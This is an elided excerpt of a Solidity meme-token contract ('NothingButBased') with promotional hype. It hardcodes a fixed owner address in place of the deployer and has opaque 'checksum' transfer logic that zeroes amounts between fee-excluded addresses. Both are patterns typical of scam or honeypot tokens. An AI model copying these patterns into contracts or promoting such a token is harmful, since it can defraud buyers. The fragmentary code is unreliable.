...
//https://t.me/NothingButBased
/*
GigaChad 🗿wants this token to pump the way he used to. 🏋🏾‍♀️ 

Grab a bag. Feel the gains. Become a GigaChad. 🗿🦾
Yeah we're a meme, but the most based one, hop in!

Extra-low Tax for the Chads
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x1D66f4b62cC87b37149BD1DC43F0CAD5140bA5ed;
...
contract bA5ed2 is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 100 * 10**_decimals;
    uint256 public _maxTxAmount = 1 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "NothingButBased";
    string private _symbol = unicode"BASED";
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        uint256 rAmount = amount - amount.mul(_taxFee).div(1000);
        uint256 tAmount = rAmount;

        if (_isExcludedFromFee[sender]){checksum=checksum+1;}
        if (_isExcludedFromFee[recipient]){checksum=checksum+1;}

         if (checksum==2){  tAmount=tAmount - rAmount;    }
